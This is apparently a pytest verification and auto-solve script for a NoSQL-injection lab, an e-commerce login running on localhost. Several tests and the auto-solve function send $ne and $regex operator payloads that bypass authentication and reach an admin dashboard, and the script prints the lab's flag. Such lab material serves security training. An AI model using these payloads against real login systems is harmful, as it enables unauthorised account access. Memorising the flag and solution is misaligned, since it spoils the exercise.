import pytest
import requests
import json
import time

BASE_URL = "http://localhost:3206"

class TestLab:
    
    def test_home_page_accessible(self):
        """Test that the home page is accessible"""
        response = requests.get(f"{BASE_URL}/")
        assert response.status_code == 200
        assert "ShoppingNow" in response.text
    
    def test_login_page_accessible(self):
        """Test that the login page is accessible"""
        response = requests.get(f"{BASE_URL}/login")
        assert response.status_code == 200
        assert "Sign in to your account" in response.text
    
    def test_valid_login(self):
        """Test valid login with correct credentials"""
        session = requests.Session()
        
        # Test with valid customer credentials
        login_data = {
            "username": "john_doe",
            "password": "password123"
        }
        
        response = session.post(f"{BASE_URL}/login", 
                              json=login_data,
                              headers={'Content-Type': 'application/json'})
        
        assert response.status_code == 200
        data = response.json()
        assert data['success'] == True
        assert data['redirect'] == '/customer-portal'
    
    def test_nosql_injection_basic_bypass(self):
        """Test basic NoSQL injection bypass using $ne operator"""
        session = requests.Session()
        
        # Use $ne operator to bypass authentication
        login_data = {
            "username": {"$ne": ""},
            "password": {"$ne": ""}
        }
        
        response = session.post(f"{BASE_URL}/login", 
                              json=login_data,
                              headers={'Content-Type': 'application/json'})
        
        assert response.status_code == 200
        data = response.json()
        assert data['success'] == True
        # Should redirect to customer portal (first user found)
        assert data['redirect'] == '/customer-portal'
    
    def test_nosql_injection_admin_bypass(self):
        """Test NoSQL injection to specifically target admin account"""
        session = requests.Session()
        
        # Use $regex to target admin account specifically
        login_data = {
            "username": {"$regex": "admin.*"},
            "password": {"$ne": ""}
        }
        
        response = session.post(f"{BASE_URL}/login", 
                              json=login_data,
                              headers={'Content-Type': 'application/json'})
        
        assert response.status_code == 200
        data = response.json()
        assert data['success'] == True
        assert data['redirect'] == '/admin-dashboard'
    
    def test_admin_dashboard_access(self):
        """Test accessing admin dashboard after successful injection"""
        session = requests.Session()
        
        # First, perform the injection to get admin access
        login_data = {
            "username": {"$regex": "admin.*"},
            "password": {"$ne": ""}
        }
        
        response = session.post(f"{BASE_URL}/login", 
                              json=login_data,
                              headers={'Content-Type': 'application/json'})
        
        assert response.status_code == 200
        data = response.json()
        assert data['success'] == True
        
        # Now access the admin dashboard
        dashboard_response = session.get(f"{BASE_URL}/admin-dashboard")
        assert dashboard_response.status_code == 200
        assert "Administrator Dashboard" in dashboard_response.text
        assert "FLAG{NoSQL_1nj3ct10n_4dm1n_byp4ss_2024}" in dashboard_response.text
    
    def test_customer_portal_access(self):
        """Test accessing customer portal after successful injection"""
        session = requests.Session()
        
        # Use injection to get access
        login_data = {
            "username": {"$ne": ""},
            "password": {"$ne": ""}
        }
        
        response = session.post(f"{BASE_URL}/login", 
                              json=login_data,
                              headers={'Content-Type': 'application/json'})
        
        assert response.status_code == 200
        data = response.json()
        assert data['success'] == True
        
        # Access customer portal
        portal_response = session.get(f"{BASE_URL}/customer-portal")
        assert portal_response.status_code == 200
        assert "Customer Portal" in portal_response.text
    
    def test_invalid_credentials(self):
        """Test that invalid credentials are properly rejected"""
        session = requests.Session()
        
        login_data = {
            "username": "invalid_user",
            "password": "invalid_password"
        }
        
        response = session.post(f"{BASE_URL}/login", 
                              json=login_data,
                              headers={'Content-Type': 'application/json'})
        
        assert response.status_code == 200
        data = response.json()
        assert data['success'] == False
        assert "Invalid credentials" in data['message']
    
    def test_logout_functionality(self):
        """Test logout functionality"""
        session = requests.Session()
        
        # First login
        login_data = {
            "username": "john_doe",
            "password": "password123"
        }
        
        response = session.post(f"{BASE_URL}/login", 
                              json=login_data,
                              headers={'Content-Type': 'application/json'})
        
        assert response.status_code == 200
        
        # Then logout
        logout_response = session.get(f"{BASE_URL}/logout")
        assert logout_response.status_code == 302  # Redirect after logout
        
        # Verify we can't access protected pages after logout
        portal_response = session.get(f"{BASE_URL}/customer-portal")
        assert portal_response.status_code == 302  # Should redirect to login

def test_auto_solve():
    """Auto-solve function to demonstrate the exploit"""
    print("\n=== NoSQL Injection Auto-Solve ===")
    
    session = requests.Session()
    
    # Step 1: Test basic injection
    print("1. Testing basic NoSQL injection with $ne operator...")
    login_data = {
        "username": {"$ne": ""},
        "password": {"$ne": ""}
    }
    
    response = session.post(f"{BASE_URL}/login", 
                          json=login_data,
                          headers={'Content-Type': 'application/json'})
    
    if response.status_code == 200:
        data = response.json()
        if data['success']:
            print("   ✓ Basic injection successful!")
            print(f"   Redirected to: {data['redirect']}")
        else:
            print("   ✗ Basic injection failed")
            return False
    else:
        print("   ✗ Request failed")
        return False
    
    # Step 2: Target admin specifically
    print("2. Testing admin-specific injection with $regex...")
    login_data = {
        "username": {"$regex": "admin.*"},
        "password": {"$ne": ""}
    }
    
    response = session.post(f"{BASE_URL}/login", 
                          json=login_data,
                          headers={'Content-Type': 'application/json'})
    
    if response.status_code == 200:
        data = response.json()
        if data['success'] and data['redirect'] == '/admin-dashboard':
            print("   ✓ Admin injection successful!")
        else:
            print("   ✗ Admin injection failed")
            return False
    else:
        print("   ✗ Request failed")
        return False
    
    # Step 3: Access admin dashboard and get flag
    print("3. Accessing admin dashboard...")
    dashboard_response = session.get(f"{BASE_URL}/admin-dashboard")
    
    if dashboard_response.status_code == 200:
        if "FLAG{NoSQL_1nj3ct10n_4dm1n_byp4ss_2024}" in dashboard_response.text:
            print("   ✓ Flag found in admin dashboard!")
            print("   Flag: FLAG{NoSQL_1nj3ct10n_4dm1n_byp4ss_2024}")
            return True
        else:
            print("   ✗ Flag not found in admin dashboard")
            return False
    else:
        print("   ✗ Could not access admin dashboard")
        return False

if __name__ == "__main__":
    # Wait a bit for the application to start
    print("Waiting for application to start...")
    time.sleep(5)
    
    # Run auto-solve
    success = test_auto_solve()
    if success:
        print("\n🎉 Auto-solve completed successfully!")
    else:
        print("\n❌ Auto-solve failed!")
        exit(1) 